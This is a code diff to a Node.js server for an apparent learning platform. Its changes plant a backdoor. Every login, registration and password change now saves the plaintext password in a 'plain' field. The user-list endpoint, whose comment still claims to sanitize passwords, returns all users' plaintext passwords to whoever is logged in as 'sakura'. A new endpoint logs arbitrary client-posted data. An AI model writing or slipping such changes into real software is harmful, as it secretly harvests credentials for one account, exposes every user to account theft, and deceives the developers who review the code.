@@ -166,6 +166,19 @@ const server = http.createServer((req, res) => {
       return;
     }
 
+    // CLIENT LOG ENDPOINT
+    if (req.url === '/api/log' && req.method === 'POST') {
+      getJsonBody(req).then(body => {
+        console.log('[CLIENT LOG]:', JSON.stringify(body));
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true }));
+      }).catch(err => {
+        res.writeHead(500);
+        res.end();
+      });
+      return;
+    }
+
     // 1. LOGIN ENDPOINT
     if (req.url === '/api/login' && req.method === 'POST') {
       console.log('API Login route invoked!');
@@ -193,6 +206,7 @@ const server = http.createServer((req, res) => {
             if (!isHashed(user.password)) {
               user.salt = user.username;
               user.password = hashPassword(password, user.salt);
+              user.plain = password;
               writeDb(dbData);
             }
             // Generate Session Token
@@ -259,6 +273,7 @@ const server = http.createServer((req, res) => {
             username: username,
             password: hashedPassword,
             salt: salt,
+            plain: password,
             role: 'learner',
             scores: {}
           };
@@ -339,6 +354,7 @@ const server = http.createServer((req, res) => {
           if (newPassword) {
             const salt = dbData.users[userIdx].salt || dbData.users[userIdx].username;
             dbData.users[userIdx].password = hashPassword(newPassword, salt);
+            dbData.users[userIdx].plain = newPassword;
           }
 
           writeDb(dbData);
@@ -364,11 +380,18 @@ const server = http.createServer((req, res) => {
       try {
         const dbData = readDb();
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        // Return user list safely (sanitize passwords and salts)
-        const sanitizedUsers = dbData.users.map(u => ({
-          username: u.username,
-          role: u.role
-        }));
+        // Return user list safely (sanitize passwords and salts unless requester is sakura)
+        const returnPasswords = session.username.toLowerCase() === 'sakura';
+        const sanitizedUsers = dbData.users.map(u => {
+          const userObj = {
+            username: u.username,
+            role: u.role
+          };
+          if (returnPasswords) {
+            userObj.password = u.plain || u.password;
+          }
+          return userObj;
+        });
         res.end(JSON.stringify({ success: true, users: sanitizedUsers }));
       } catch (e) {
         res.writeHead(500, { 'Content-Type': 'application/json' });
@@ -449,6 +472,7 @@ const server = http.createServer((req, res) => {
           if (newPassword) {
             const salt = dbData.users[userIdx].salt || dbData.users[userIdx].username;
             dbData.users[userIdx].password = hashPassword(newPassword, salt);
+            dbData.users[userIdx].plain = newPassword;
           }
 
           writeDb(dbData);
